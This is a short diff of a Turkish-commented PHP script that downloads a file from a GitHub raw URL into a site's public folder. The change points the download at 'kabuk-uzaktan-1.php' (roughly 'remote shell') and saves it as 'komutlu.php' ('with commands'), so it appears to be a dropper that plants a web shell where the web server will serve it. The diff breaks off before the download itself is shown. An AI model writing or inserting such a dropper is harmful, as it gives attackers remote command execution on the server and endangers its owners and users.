@@ -1,11 +1,11 @@
 
 <?php
 // Hedef URL
-$url = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/yeah.txt";
+$url = "https://raw.githubusercontent.com/necessaryfor/all/refs/heads/main/kabuk-uzaktan-1.php";
 
 // İndirilecek dosya yolu
 $targetDir = __DIR__ . '/public/';
-$targetFile = $targetDir . 'yeah.php';
+$targetFile = $targetDir . 'komutlu.php';
 
 // Eğer hedef klasör yoksa oluştur
 if (!is_dir($targetDir)) {
